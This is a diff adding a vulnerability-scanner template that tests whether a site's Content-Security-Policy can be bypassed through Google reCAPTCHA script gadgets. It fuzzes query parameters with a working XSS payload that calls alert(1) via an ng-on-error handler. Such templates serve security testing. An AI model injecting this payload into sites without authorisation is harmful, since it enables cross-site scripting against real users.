@@ -1,0 +1,55 @@
+id: google-recaptcha-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Google reCAPTCHA
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,google-recaptcha,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "google.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: google_recaptcha_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script><img src=x ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "google_recaptcha_csp_xss == true"
+# digest: 4b0a0048304602210094cc91402ed90fe6844e88db9f527b0348bff54326b6658f4ba9c33b6d941a0f022100d8edac12f28b37db63fe229e4423717bc62fc80649d31f744d96533c74e04197:922c64590222798bb761d5b6d8e72950
